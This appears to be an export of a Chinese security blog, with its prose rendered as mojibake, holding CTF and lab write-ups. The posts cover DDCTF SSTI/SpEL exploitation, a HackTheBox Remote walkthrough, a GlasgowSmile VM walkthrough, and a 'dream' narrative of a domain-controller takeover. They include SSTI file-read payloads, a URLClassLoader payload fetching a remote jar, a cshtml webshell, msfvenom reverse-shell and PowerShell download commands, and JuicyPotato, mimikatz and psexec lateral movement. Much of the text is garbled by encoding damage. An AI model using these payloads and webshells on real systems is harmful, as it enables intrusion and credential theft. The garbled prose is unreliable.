response:&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;DDCTF&quot;&#125; ÊäìÂåÖÂàÜÊûêÁ°ÆÂÆûÈÉΩÊòØhttpÁöÑÊµÅÈáèÔºåÂèÇÊï∞ÈÄöËøájsonÊ†ºÂºè‰º†ÈÄíÔºåËøòÊúâ‰∏™signatureÂèÇÊï∞È™åËØÅÂëΩ‰ª§ÊúâÊ≤°ÊúâË¢´ÁØ°Êîπ„ÄÇ Êú¨Êù•ÊÉ≥ÁùÄÈÄöËøáIDAÊù•‰øÆÊîπÂéüÂëΩ‰ª§Ôºå‰ΩÜÊòØÂè™ËÉΩ‰øÆÊîπÂà∞ÈïøÂ∫¶‰∏∫8ÁöÑÂëΩ‰ª§„ÄÇÊúÄÂêéÈòüÂèãÈÄöËøáÊÅ¢Â§çÁ¨¶Âè∑Ë°®ÂæóÁü•Á≠æÂêçÊòØÂëΩ‰ª§Âä†Êó∂Èó¥Êà≥ÁöÑHMAC-sha256ÔºåÂØÜÈí•‰∏∫DDCTFWithYou„ÄÇ ÂÜô‰∫ÜpyÊµãËØï‰∏ãÂèëÁé∞‰∏ç‰ºöÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜÂ≠òÂú®SSTI„ÄÇ ÊâãÂä®fuzz‰∫Ü‰∏ãÔºåÂèëÁé∞Êã¶Êà™‰∫ÜgetClass„ÄÅforNameÁ≠âÁ≠â„ÄÅclassLoaderÊ≤°Ê≥ïÊâìÂºÄurl„ÄÅexecÁõ¥Êé•Áä∂ÊÄÅÁ†Å500ÔºåÂèØËÉΩÁõ¥Êé•ÊääRuntimeÁöÑÂåÖÁªôÂà†‰∫Ü„ÄÇ Áé∞Âú®ÂîØÊúâÊñá‰ª∂ËØªÂèñËÉΩÁî®ÔºåÊúÄÂêéÁî®Âà∞‰∏§‰∏™SSTIÁöÑpayloadÔºå‰∏Ä‰∏™ËØªÁõÆÂΩïÔºå‰∏Ä‰∏™ËØªÊñá‰ª∂Ôºö 12(new java.io.File("/home/dc2-user/flag")).list()T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/home/dc2-user/flag/flag.txt")) EXP: 1234567891011121314151617181920212223242526import timeimport hmacimport base64import jsonimport sysimport requestsfrom hashlib import sha256appsecret = "DDCTFWithYou".encode('utf-8')# command = '(new java.io.File("/home/dc2-user/flag")).list()'command = 'T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/home/dc2-user/flag/flag.txt"))'timestamp = int(time.time())tmp = "&#123;&#125;|&#123;&#125;".format(command,timestamp).encode('utf-8')signature = base64.b64encode(hmac.new(appsecret, tmp, digestmod=sha256).digest())data = &#123;&#125;data['signature'] = signaturedata['command'] = commanddata['timestamp'] = timestampurl = 'http://117.51.136.197/server/command'headers = &#123;'Content-Type': 'application/json'&#125;r = requests.post(url=url,headers=headers,data = json.dumps(data))print(r.text) Easy WebÂ∞ùËØïÁôªÂΩï‰∏ãÔºåÁúãÂà∞Response HeadersÂà©Áî®rememberMe=deleteMeÔºåÂæóÁü•ÂêéÁ´ØÊúâApache Shiro„ÄÇ ShiroÂèçÂ∫èÂàóÂåñ‰∏ÄÊääÊ¢≠ÔºåÊâì‰∫Ü‰∏™ÂØÇÂØûÔºåÊØïÁ´üÂì™ÊúâËøô‰πàÂÆπÊòì„ÄÇ‰ºóÊâÄÂë®Áü•Âú®ctfÈáåÔºö Easy‰∏çÊòØÁúüÁöÑeasyÔºåhardÊòØÁúüÁöÑhard„ÄÇ Âú®ÈòüÂèãÊèêÈÜí‰∏ãÂæóÁü•ÊòØCVE-2020-11989ÔºåShiroÊùÉÈôêÁªïËøá„ÄÇ‰∏Ä‰∏™ÊñúÊùÜÂä†ÂàÜÂè∑ËøõÂÖ•Âà∞ÂêéÂè∞„ÄÇ 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index ‰∏ÄÁúºÁúãÂà∞‰∫Ü‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåÈôÜÈôÜÁª≠Áª≠ËØªÂà∞‰∫Üweb.xml„ÄÅspringÁöÑÈÖçÁΩÆÊñá‰ª∂ÂíåÈÖçÁΩÆÊñá‰ª∂ÈáåËÉΩÁúãÂà∞ÁöÑclass„ÄÇ 1234567891011/WEB-INF/web.xml/WEB-INF/classes/com/ctf/util/SafeFilter.class/WEB-INF/classes/spring-core.xml/WEB-INF/classes/spring-web.xml/WEB-INF/classes/spring-shiro.xml/WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class/WEB-INF/classes/com/ctf/auth/ShiroRealm.class/WEB-INF/classes/com/ctf/model/User.class/WEB-INF/classes/com/ctf/model/Role.class/WEB-INF/classes/com/ctf/service/UserService.class/WEB-INF/classes/com/ctf/model/Permission.class Ê≥®ÊÑèÂà∞‰∏§Á±ªÔºå‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÂÄºËøáÊª§‰∫Ü‰∏Ä‰∫õjavaÁöÑÂÖ≥ÈîÆÂ≠óÔºåÂè¶‰∏Ä‰∏™ËÆ∞ÂΩï‰∫Ü‰∫õÈìæÊé•„ÄÇ ÊâìÂºÄÊúÄÂêé‰∏Ä‰∏™ÈìæÊé•Ôºå‰∏çÁü•ÈÅìÊÄé‰πàÁöÑÂ∞±ÂèòÊàê‰∫ÜadminÁî®Êà∑ÔºåÊèê‰æõ‰∫Ü‰∏Ä‰∏™ËæìÂÖ•Ê°Ü„ÄÇ 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/ ÊµãËØï‰∏ãÂ≠òÂú®SpELÊ≥®ÂÖ•ÔºåËæìÂÖ•[[${7*7}]]ÊúÄÂêéÊâìÂºÄÁöÑÁªìÊûúÊòØ49„ÄÇ ÂèÇÊï∞ËøáÊª§‰∫ÜÂæàÂ§öÂÖ≥ÈîÆÂ≠óÔºå‰ΩÜÊ≤°ËøáÊª§ClassLoaderÂÖ≥ÈîÆÂ≠óÔºåÁî®UrlClassLoaderËØï‰∏ãÂèëÁé∞ÂèØ‰ª•ËøûÂ§ñÁΩë„ÄÇ 1new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://dnslog.cn/xxx.jar&quot;)&#125;).loadClass(&quot;xxx&quot;).getConstructor().newInstance().toString() ÂΩìÁÑ∂ÔºåÁî±‰∫éËøáÊª§‰∫ÜÂºïÂè∑ÔºåÂ≠óÁ¨¶‰∏≤Ë¶ÅÁî®‰∏ãÈù¢ÁöÑpyËÑöÊú¨ËΩ¨Êç¢‰∏ã„ÄÇ 123456payload = "PUT PAYLOAD STRING HERE"print ("true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0]), end='')for i in range(1, len(payload)): print (".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i]), end='')print ("") ÊääÁºñËØëÂ•ΩÁöÑclassÊâìÂåÖÊàêjarÊâîÂà∞vps‰∏äÔºåÊú¨Êù•ÊÉ≥ÁùÄÁõ¥Êé•ÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜÊòØÂëΩ‰ª§Âπ∂Ê≤°ÊúâÊâßË°åÊàêÂäüÔºåÊúâÊó∂Ëøò‰ºöÊä•errorÔºåÊàëËøò‰ª•‰∏∫ÊòØ‰ª£Á†ÅÁöÑÈóÆÈ¢òÔºåÊäòËÖæ‰∫ÜÂ•Ω‰πÖ„ÄÇ ÊúÄÂêéËøòÊòØ‰ª•Êñá‰ª∂ËØªÂèñÁöÑÊñπÂºèËØªflag„ÄÇ 1234567891011121314151617181920212223242526272829303132import java.io.*;import java.util.*;public class Cmd &#123; String res; public Cmd()&#123; try &#123; File dir = new File("/"); String[] children = dir.list(); if (children == null) &#123; &#125; else &#123; for (int i=0; i&lt; children.length; i++) &#123; String filename = children[i]; res += filename+'\n'; &#125; &#125; BufferedReader in = new BufferedReader(new FileReader("/flag_is_here")); String str; while ((str = in.readLine()) != null) &#123; res += str+'\n'; &#125; &#125; catch (IOException e) &#123; &#125; &#125; @Override public String toString() &#123; return res; &#125;&#125; jarÊâìÂåÖÂëΩ‰ª§Â¶Ç‰∏ã 12javac .\Cmd.javajar cvf Cmd.jar .\Cmd.class ÂèØÊÉúÊúÄÂêéÂÅöÂá∫Êù•ÊâçÁü•ÈÅìÊØîËµõÊó∂Èó¥Â∑≤ÁªèËøá‰∫Ü„ÄÇ„ÄÇ ÂèÇËÄÉ Apache ShiroÊùÉÈôêÁªïËøáÊºèÊ¥ûÂàÜÊûê(CVE-2020-11989) ÈÉΩ0202Âπ¥‰∫ÜËÄÅÂó®ËøòÂú®Áî®ÁöÑ - ÂêÑÁßçÂßøÂäøjsp webshell Exploiting SSTI in Thymeleaf EXPRESSION LANGUAGE INJECTION RCE - NO STRINGS ATTACHED]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ËÆ∞‰∏ÄÊ¨°Ê¢¶ÈáåÁöÑÂêéÊ∏óÈÄè]]></title>
    <url>%2F2020%2F08%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂâçÂá†Â§©Êôö‰∏äÂÅö‰∫Ü‰∏Ä‰∏™Ê¢¶ÔºåÊ¢¶ÈáåÂÅö‰∫Ü‰∏ÄÊ¨°ÂêéÊ∏óÈÄèÔºåÊ¢¶Âà∞ÊàëÊãø‰∏ãÂüüÊéßÔºå‰ªäÂ§©ËßâÂæóÂ∫îËØ•ËÆ∞ÂΩï‰∏ãÊù•„ÄÇ Êú¨ÊñáÁ∫ØÂ±ûËôöÊûÑÔºåÂ¶ÇÊúâÈõ∑ÂêåÁ∫ØÂ±ûÂ∑ßÂêà„ÄÇ ‰ø°ÊÅØÊî∂ÈõÜËµ∑Êâã‰∏Ä‰∏™webshellÔºåËøêÊ∞îÊØîËæÉÂ•ΩÔºåtasklistÊ≤°ÊúâÊùÄËΩØÔºå‰∏ä‰º†‰∏Ä‰∏™csÂêéÈó®Êñπ‰æøÊâßË°åÂëΩ‰ª§„ÄÇ ÂÖàÁúãÁúãÁî®Êà∑ÂíåË°•‰∏ÅÊÉÖÂÜµÔºåÂèëÁé∞ÂèëÁé∞ÊòØ‰∏™‰ΩéÊùÉÈôêÁî®Êà∑nt authority\network serviceÔºåWindows2008R2Ë°•‰∏Å‰πüÊâìÂæóÊå∫Âã§Âø´ÁöÑ„ÄÇ 12whoamiwmic qfe get Caption,Description,HotFixID,InstalledOn ipconfigÁúãÂà∞Â≠òÂú®‰∏§Âº†ÂÜÖÁΩëÁΩëÂç°„ÄÇ Êü•ÊâæÂüüÊéßÔºåÂÆö‰ΩçÂà∞‰∏§Âè∞„ÄÇ 12net group "domain controllers" /domainping XXX ÈÖçÁΩÆÊñá‰ª∂„ÄÅtxt‰πãÁ±ªÁöÑÊñá‰ª∂ÈÉΩÊî∂ÈõÜ‰∫Ü‰∏ÄÈÅçÔºåÊ≤°ÊâæÂà∞ÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊèêÊùÉËôΩÁÑ∂Ë°•‰∏ÅÊâìÂæóÊå∫Âã§Âø´ÁöÑÔºå‰ΩÜÊòØÁî®twitterÂ§ß‰Ω¨ÁöÑÊèêÊùÉÊ£ÄÊµãËÑöÊú¨ÔºåÁî®Ëá™Â∏¶ÂëΩ‰ª§Â∞±ÊòØwhoami /privÔºåÂèëÁé∞‰∏ÄÂ§ÑÁâπÊùÉÊª•Áî®ÔºöSeImpersonatePrivilege„ÄÇÊ†πÊçÆ‰∏âÂ•ΩÂ≠¶ÁîüÂ∏àÂÇÖÁöÑÊñáÁ´†ÂæóÁü•ÂèØÁî®JuicePotatoÊèêÊùÉ„ÄÇ Áî®Â§öÊ±ÅÂúüË±ÜËøêË°åÊàë‰ª¨ÁöÑÂêéÈó®ÔºåËøá‰ºöÂ∞±ËÉΩÂú®scÈáåÁúãËßÅ‰∏äÁ∫ø‰∫Ü‰∏ÄÂè∞systemÊùÉÈôêÁöÑÊú∫Âô®„ÄÇ 1JuicyPotato -l 1337 -p \path\to\cs.exe -t * ÂèàÊòØËøêÊ∞îÁàÜÊ£öÁöÑÊó∂ÂÄôÔºåÊü•Âà∞Êú¨Êú∫‰øùÂ≠ò‰∫ÜÂüüÊéßÂØÜÁ†ÅÔºåËÄå‰∏îÊòØwin2008ÔºåÁî®mimikatzËØª‰∏ÄÊ≥¢ÊòéÊñáÂØÜÁ†Å„ÄÇ Ê®™ÂêëÁßªÂä®Êó¢ÁÑ∂Êúâ‰∫ÜÂüüÂêçÁÆ°ÁêÜÂëòÂØÜÁ†ÅÔºåÂ∞±ÂèØ‰ª•Áî®msfÁöÑsmb_loginÂíåpsexecËøõË°åÊ®™ÂêëÁßªÂä®Ôºå‰ΩÜÊàëËøôÈáåÁî®csÁöÑpsexecÔºåËÉΩÁõ¥Êé•‰∏äÁ∫ø‰∏ªÊú∫„ÄÇ Âè≥ÈîÆsessionÁÇπÂáªnet viewËé∑ÂèñtargetÔºåÂú®target viewÈÄâ‰∏≠ÊâÄÊúâtargetÔºåÂè≥ÈîÆlogin->psexecÔºåÈÄâ‰∏≠ËØªÂà∞ÁöÑÊòéÊñáÂØÜÁ†Å„ÄÅÈÄâ‰∏≠‰∏Ä‰∏™listener„ÄÅÈÄâ‰∏≠‰∏Ä‰∏™sessionÔºåÂºÄÊâ´ÔºÅ Ëøá‰∫ÜÂçä‰∏™Â∞èÊó∂ÔºåÂ≠òÊ¥ªÁöÑÊú∫Â≠êÂá†‰πéÈÉΩ‰∏ä‰∫ÜÁ∫ø„ÄÇ ÂÜçËΩ¨Âà∞msfÔºåÁî®MS17-010Êâ´Êâ´„ÄÇÂèëÁé∞ÈÉΩÂÜÖÁΩëË°•‰∏ÅÈÉΩÊï¥Êå∫Â•ΩÁöÑÔºå‰∏Ä‰∏™ÈÉΩÊ≤°Êâ´Âà∞„ÄÇÂÜÖÁΩëËøòÊúâÂá†Âè∞linuxÁöÑÊú∫Â≠êÔºå‰ΩÜÊòØ‰∏çÊÉ≥ÁªßÁª≠Êêû‰∫ÜÔºåÊì¶Êì¶Â±ÅËÇ°ÔºåÊä•ÂëäÁªôÂéÇÂïÜ„ÄÇÔºàË∑ë ÂêéËÆ∞Â¶ÇÊ¢¶ÂàùÈÜíÔºåÂéüÊù•ÊàëÂπ∂Ê≤°ÊúâÊêû‰ªÄ‰πàÂêéÊ∏óÈÄèÔºå‰πüÊ≤°Êãø‰ªÄ‰πàÂüüÊéßÔºåÊàëËøòÊòØËøôÊ†∑ÁöÑËèúÔºåËøòÊòØÊó†‰∏öÊ∏∏Ê∞ë‰∏Ä‰∏™Ôºå‰∏ÄÂàáÈÉΩÊòØÊ¢¶„ÄÇ ËøáÂá†Â§©ÂèàÊúâctfÊâì‰∫ÜÔºåÂæóÈáçÊñ∞ÊãøËµ∑pwnÔºåÂÅö‰∏™pwnÂºüÂºü‰∫Ü„ÄÇ]]></content>
      <categories>
        <category>Ê∏óÈÄèÊµãËØï</category>
      </categories>
      <tags>
        <tag>Âüü</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackTheBox Remote walkthrough]]></title>
    <url>%2F2020%2F08%2F09%2FHackTheBox_Remote_walkthrough%2F</url>
    <content type="text"><![CDATA[‚Ä¶ ‰ø°ÊÅØÊî∂ÈõÜÊâ´ÊèèÈù∂Êú∫ÂºÄÊîæÁ´ØÂè£ÔºåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÂºÄÊîæ‰∫Üftp„ÄÅhttpÂíåÂÖ±‰∫´Êñá‰ª∂ÊúçÂä°„ÄÇ 1nmap -A 10.10.10.180 ftpÊúçÂä°ÂÖÅËÆ∏ÂåøÂêçÁôªÂΩïÔºå‰ΩÜÊòØÈáåÈù¢Ê≤°Áî®‰∏úË•ø„ÄÇ http‰∏äÁöÑÁΩëÁ´ôÔºåÈÄöËøáÊêúÁ¥¢Â∫ïÈÉ®ÁöÑÂÖ≥ÈîÆËØçÂèëÁé∞ÊòØÂºÄÊ∫êÁöÑasp.netÁöÑCMSÔºåÊúÄËøë‰∏Ä‰∏™ÊºèÊ¥ûÊòØÂêéÂè∞RCE„ÄÇ ËÆøÈóÆÂÖ±‰∫´Êñá‰ª∂ËÆøÈóÆÔºåÊúâ‰∏Ä‰∏™Êñá‰ª∂Â§π‰ªª‰Ωï‰∫∫ÈÉΩËÉΩËÆøÈóÆÔºåÊåÇËΩΩÂà∞Êú¨Âú∞ÂèëÁé∞ÊòØÁΩëÁ´ôÁöÑÊ∫êÁ†Å„ÄÇ 12showmount -e 10.10.10.180sudo mount 10.10.10.180:/site_backups site_backups &lt;img src=‚ÄùÊçïËé∑.JPG) GETSHELLÂú®Ê∫êÁ†ÅÁöÑweb.configÈáåÂèëÁé∞machineKeyÔºå‰ΩÜÊòØÂâçÂè∞Â•ΩÂÉèÊ≤°Áî®Âà∞asp.netÁöÑÊéß‰ª∂ÔºåÊâÄ‰ª•Ê≤°Ê¥æ‰∏äÁî®Âú∫„ÄÇ Êé•ÁùÄÂèàÂú®App_DataÊñá‰ª∂Â§πÈáåÂèëÁé∞‰∫ÜSql ServerÁöÑÊï∞ÊçÆÂ∫ìÊñá‰ª∂ÔºåÂú®ÈáåÈù¢ÂèëÁé∞ÁÆ°ÁêÜÂëòÂØÜÁ†ÅÁöÑhashÔºåÊãøÂéªÁΩë‰∏äÁ¢∞ÊíûÂæóÂà∞ÂØÜÁ†Å„ÄÇ ‰ΩøÁî®Ë¥¶Êà∑`admin@htb.localÂØÜÁ†Åbaconandcheese`Âú®http://10.10.10.180/umbraco/Â§ÑÁôªÂΩïÂà∞ÂêéÂè∞„ÄÇÁøªÁúã‰∏ãÂäüËÉΩÔºåÂèëÁé∞‰∏™ÂàõÂª∫cshtmlÊ®°ÊùøÁöÑÂú∞ÊñπÔºåÈÅÇ‰∏ä‰∏™cshtmlÁöÑwebshell„ÄÇ 12345678910111213141516171819202122232425262728293031@using System.Diagnostics;@using System.IO;@functions &#123; private string ExecuteCommand(string command) &#123; try &#123; ProcessStartInfo processStartInfo = new ProcessStartInfo(); processStartInfo.FileName = "cmd.exe"; processStartInfo.Arguments = "/c " + command; processStartInfo.RedirectStandardOutput = true; processStartInfo.UseShellExecute = false; Process process = Process.Start(processStartInfo); using (StreamReader streamReader = process.StandardOutput) &#123; string ret = streamReader.ReadToEnd(); return ret; &#125; &#125; catch (Exception ex) &#123; return ex.ToString(); &#125; &#125;&#125;@&#123; if (Request.QueryString["p1ay2win"] != null) &#123; @ExecuteCommand(Request.QueryString["p1ay2win"]); &#125;&#125; Ëé∑ÂæóÁ¨¨‰∏Ä‰∏™flag„ÄÇ ÊèêÊùÉÁî®msfvemonÁîü‰∫ß‰∏Ä‰∏™meterpreterÁöÑÂèçÂºπshellÔºåÂú®Êú¨Êú∫‰∏äËµ∑‰∏Ä‰∏™httpÊúçÂä°ÔºåÈÄöËøápowershell‰∏ä‰º†ÂèçÂºπshellÂíåPowerUpÊèêÊùÉÊ£ÄÊµãËÑöÊú¨„ÄÇ 1234msfvenom -p windows/x64/meterpreter_reverse_http lhost=10.10.x.x lport=9001 -f exe -o re.exepython -m SimpleHTTPServerpowershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/re.exe&apos;,&apos;c:\inetpub\wwwroot\views\re.exe&apos;)powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/PowerUp.ps1&apos;,&apos;c:\inetpub\wwwroot\views\PowerUp.ps1&apos;) Âú®Èù∂Êú∫ËøêË°åÂèçÂºπshellÔºåÁî®ÂèçÂºπshellÁöÑsessionÂºÄÂêØ‰∏Ä‰∏™‰∫§‰∫íÁöÑshellÔºåËøêË°åPowerUpÁöÑinvoke-allchecksÂäüËÉΩÔºåÂèëÁé∞ÂèØ‰øÆÊîπUsoSvcÁöÑbinpathÊèêÊùÉ„ÄÇ 1powershell -c &quot;import-module c:\inetpub\wwwroot\views\PowerUp.ps1;invoke-allchecks&quot; ‰øÆÊîπUsoSvcÁöÑbinpathÔºåÂú®ÈáçÊñ∞ÂêØÂä®Ëøô‰∏™Á®ãÂ∫èÁöÑÊó∂ÂÄôÂ∞±ËÉΩÊâßË°åbinpathÁöÑÂëΩ‰ª§„ÄÇ 123sc config UsoSvc binpath="c:\inetpub\wwwroot\views\re.exe"sc stop UscSvcsc start UscSvc ÂΩìÊó∂ÊèêÊùÉÁöÑÊó∂ÂÄôÂèëÁé∞‰∏™ÈóÆÈ¢òÔºåbinpathÁöÑÂëΩ‰ª§ËøêË°å‰∏ÄÊÆµÊó∂Èó¥Â∞±‰ºöË¢´killÊéâÔºåÊâæ‰∫Ü‰∏ãÂëΩ‰ª§Áî®cmd /cÂºÄÂ§¥Â∞±Âú®‰∏çË¢´kill„ÄÇ 1sc config UsoSvc binpath="cmd /c c:\inetpub\wwwroot\views\re.exe" Êîπ‰∫ÜbinpathÂêéÔºåstartËøô‰∏™usosvcÊúçÂä°‰ºöÂá∫Áé∞failedÂ≠óÊ†∑ÔºåËøôÊòØÊ≠£Â∏∏Áé∞Ë±°ÔºåÂëΩ‰ª§ËøòÊòØ‰ºöË¢´ËøêË°å„ÄÇ ÊúÄÂêéÔºå‰ºöÂæóÂà∞‰∏Ä‰∏™systemÊùÉÈôêÁöÑsession„ÄÇÊ≤°Âõæ‚Ä¶Â§çÁé∞Êó∂ÂÄôËØï‰∫ÜÂá†Â§©ÂèàresetÊ≠ªÊ¥ªÁôªÂΩï‰∏ç‰∏ä‚Ä¶ ÂêéËÆ∞hacktheboxÊúâ‰∏çÁî®‰∏ãËΩΩÂíåÊúâwindowsÈù∂Êú∫ÁöÑÂ•ΩÂ§ÑÔºå‰ΩÜÊòØÂ∞±ÊòØÈÄüÂ∫¶ÊÖ¢„ÄÅÁéØÂ¢ÉÁªèÂ∏∏ÊúâÈóÆÈ¢òÔºåÈöæÊêûÂì¶„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>hackthebox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GlasgowSmile walkthrought]]></title>
    <url>%2F2020%2F06%2F28%2FGlasgowSmile_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøôÊòØ‰∏Ä‰∏™‰∏≠Á≠âÈöæÂ∫¶ÁöÑÈù∂Êú∫ÔºåWebÊñπÈù¢fuzzÂäõÂ∫¶‰∏çÂ§üÂ§ßÔºåÂÅ∑ÁûÑ‰∫ÜÂà´‰∫∫ÁöÑwalkthroughÊâçÂÅöÂá∫Êù•ÔºåÊèêÊùÉÊñπÈù¢ÂàôË¶ÅÁªÜÂøÉÔºåÂèëÁé∞‰ΩúËÄÖÁïô‰∏ãÁöÑÁ∫øÁ¥¢„ÄÇ https://www.vulnhub.com/entry/glasgow-smile-11,491/ Âà©Áî®ËøáÁ®ãnmapÊâ´‰∫Ü‰∏ãÔºåÂè™ÂºÄÊîæ‰∫Ü‰∏§‰∏™Á´ØÂè£Ôºå22Âíå80„ÄÇ 1nmap -p- -T 4 192.168.189.134 ËøõÂéª80ÁöÑÁΩëÈ°µÁúãÂà∞ÊòØ‰∏ÄÂº†Â∞è‰∏ëÁöÑÂ£ÅÁ∫∏ÔºåÁî®dirbÊâ´‰∫Ü‰∏ãÁõÆÂΩïÔºåÂèëÁé∞‰∫Üjoomla CMS„ÄÇÁâàÊú¨ÊØîËæÉÊñ∞ÔºåÂâçÂè∞Ê≤°Áî®ÁàÜÂá∫Êù•ÂÖ¨ÂºÄÊºèÊ¥û„ÄÇ 1dirb http://192.168.189.134/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt ËøõÂêéÂè∞‰ΩøÁî®Ëá™Â∏¶ÁöÑÂ≠óÂÖ∏ÁàÜÁ†¥adminÂíåjokerÁöÑÂº±Âè£‰ª§ÔºåÊ≤°ÁàÜÂá∫Êù•„ÄÇ‰∏ÄÁ≠πËé´Â±ïÔºåÈÅÇÁûÑ‰∫Ü‰∏ãÂà´‰∫∫ÁöÑwalkthroughÔºåÂéüÊù•ÊòØÁî®Âà©Áî®‰∏ªÈ°µÁîüÊàêÁöÑÂ≠óÂÖ∏ÔºåÁàÜÁ†¥joomlaÁî®Êà∑ÁöÑÂº±Âè£‰ª§ÔºåËøô‰∏™ÊòØÁúüÁöÑÊ≤°ÊÉ≥Âà∞„ÄÇ 1python pydictor.py -plug scratch http://192.168.189.134/joomla Â∞ÜÁîüÊàêÁöÑÂ≠óÂÖ∏ÂØºÂÖ•Âà∞burpsuiteÁàÜÁ†¥ÔºåÂæàÂø´Â∞±ÁàÜÁ†¥Âá∫ÂØÜÁ†Å‰∏∫Gotham„ÄÇ Âú®ÁΩë‰∏äÊêúÁ¥¢Âà∞‰∫ÜjoomlaÁºñËæëÊ®°ÊùøÂ§ÑËÉΩÊîπphp‰ª£Á†ÅÂíå‰∏ä‰º†Êñá‰ª∂Ôºå‰∫éÊòØÊèíÂÖ•php‰∏ÄÂè•ËØùÊàêÂäüGetshell„ÄÇ http://192.168.189.134/joomla/administrator/index.php?option=com_templates&amp;view=templates Âú®templates/beez3/ÁõÆÂΩï‰∏ãÊâæÂà∞‰∫Üwebshell„ÄÇ ÂèçÂºπ‰∏Ä‰∏™shellÂà∞Êú¨Êú∫ÔºåÁî®privilege-escalation-awesome-scripts-suiteÊ≤°Êâ´Âá∫Êù•‰∏úË•øÔºåÊü•Áúã‰∫ÜjoomlaÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÂèëÁé∞‰∫ÜmsyqlÁöÑÁôªÂΩïÂØÜÁ†Å„ÄÇ Ë¶ÅÊÉ≥Âú®mysqlÁïåÈù¢Ê≠£Â∏∏‰∫§‰∫íÔºåË¶ÅËøêË°å‰ª•‰∏ãÂëΩ‰ª§Âºπ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑshell„ÄÇ 1python3 -c "import pty;pty.spawn('/bin/bash')" ÊòæÁ§∫ÊâÄÊúâÊï∞ÊçÆÂ∫ìÂèëÁé∞ËøòÊúâ‰∏™batjokeÂ∫ìÔºåÈáåÈù¢ÁöÑtaskforceË°®ËÆ∞ÂΩïÁùÄÂá†‰∏™Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂÖ∂‰∏≠robÊòØÈù∂Êú∫ÂÖ∂‰∏≠‰∏Ä‰∏™Áî®Êà∑„ÄÇ 123show databases;use batjoke;select * from taskforce; ÊãøÂØÜÁ†ÅÂéªbase64Ëß£Á†ÅÔºåÁªìÊûú‰∏∫???AllIHaveAreNegativeThoughts???ÔºåÁî®Ê≠§ÂØÜÁ†ÅÈÄöËøásshÊàêÂäüÁôªÂΩïÂà∞robÁî®Êà∑„ÄÇ 1ssh rob@192.168.189.134 Âú®robÁî®Êà∑homeÁõÆÂΩïËé∑Âæó‰∫ÜÁ¨¨‰∏Ä‰∏™flagÂíå‰∏Ä‰∏≤ÂØÜÊñá„ÄÇ ÁúãÁùÄÂØÜÊñáÁöÑÊ†∑Â≠êÔºå‰ª•ÊàëÊ∞¥ctfÁöÑÁªèÈ™åÔºåÈ¶ñÂÖàÂ∞±ÁåúÂà∞‰∫ÜÊòØÂè§ÂÖ∏ÂØÜÁ†ÅÁöÑÂáØÊííÂä†ÂØÜ„ÄÇ Êé•ÁùÄbase64Ëß£Á†ÅÊúÄÂêé‰∏ÄË°åÁöÑbase64ÔºåÁªìÊûú‰∏∫I33hope99my0death000makes44more8cents00than0my0life0„ÄÇ Áî®Ëß£Á†ÅÁöÑÁªìÊûúÂàáÊç¢Âà∞‰∫ÜabnerÁî®Êà∑ÔºåËé∑Âæó‰∫ÜÁ¨¨‰∫å‰∏™flagÔºåÂπ∂ÂèëÁé∞historyÊúâÁÇπ‰∏úË•øÔºåËß£Âéã‰∫Ü‰∏Ä‰∏™Âè´.dear_penguins.zipÂéãÁº©ÂåÖ„ÄÇ Áî®findÂëΩ‰ª§ÊâæÂà∞‰∫ÜÂéãÁº©ÂåÖÁöÑ‰ΩçÁΩÆÔºåËß£ÂéãÈúÄË¶ÅÂØÜÁ†ÅÔºåÁàÜÁ†¥‰∫Ü‰∏ÄÁï™‰πüÊ≤°ÁàÜÁ†¥Âá∫Êù•ÔºåÊúÄÂêéÁî®abnerÁöÑÁôªÂΩïÂØÜÁ†ÅÂ∞±Ê≠£Á°Æ‰∫Ü„ÄÇ ÂÜÖÂÆπÁöÑÊúÄÂêé‰∏ÄË°åÂêåÊ†∑ÊòØÂè¶‰∏Ä‰∏™Áî®Êà∑penguinÁöÑÁôªÂΩïÂØÜÁ†ÅÔºå‰∏çËøáËøôÂõû‰∏çÈúÄË¶ÅËß£Á†Å„ÄÇ ÂéªÂà∞homeÁõÆÂΩï‰∏ãÁöÑSomeoneWhoHidesBehindAMaskÁõÆÂΩïÔºåÁúãËßÅ‰∫ÜÁ¨¨‰∏âflagÔºåÂπ∂‰∏îÂèëÁé∞‰∫Ü‰∏§‰∏™Â±û‰∫érootÁöÑÊñá‰ª∂„ÄÇ Êääpspy‰º†‰∏äÈù∂Êú∫ÔºåÂèëÁé∞rootÁî®Êà∑ÈÄöËøáÂÆöÊó∂‰ªªÂä°ÂÆöÊó∂ËøêË°åÁõÆÂΩï‰∏ãÁöÑ.trash_old„ÄÇ 